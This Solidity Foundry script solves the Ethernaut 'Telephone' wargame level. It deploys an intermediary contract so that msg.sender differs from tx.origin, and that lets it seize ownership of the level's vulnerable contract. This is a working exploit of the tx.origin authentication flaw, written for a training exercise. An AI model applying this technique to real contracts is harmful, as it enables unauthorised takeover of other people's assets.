// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script} from "forge-std/Script.sol";
import {EthernautScript} from "src/common/EthernautScript.sol";
import {Telephone} from "./Problem.sol";

contract TelephoneSolution {
    function changeOwner(Telephone _phone, address _newOwner) external {
        _phone.changeOwner(_newOwner);
    }
}

contract SolutionScript is EthernautScript {
    function solve(address payable _instanceAddress) internal override {
        vm.startBroadcast();

        Telephone problem = Telephone(_instanceAddress);
        TelephoneSolution solution = new TelephoneSolution();
        solution.changeOwner(problem, tx.origin);

        assert(problem.owner() == tx.origin);

        vm.stopBroadcast();
    }

    function getLevelAddress() internal view override returns (address) {
        return _getContractAddress("4");
    }
}
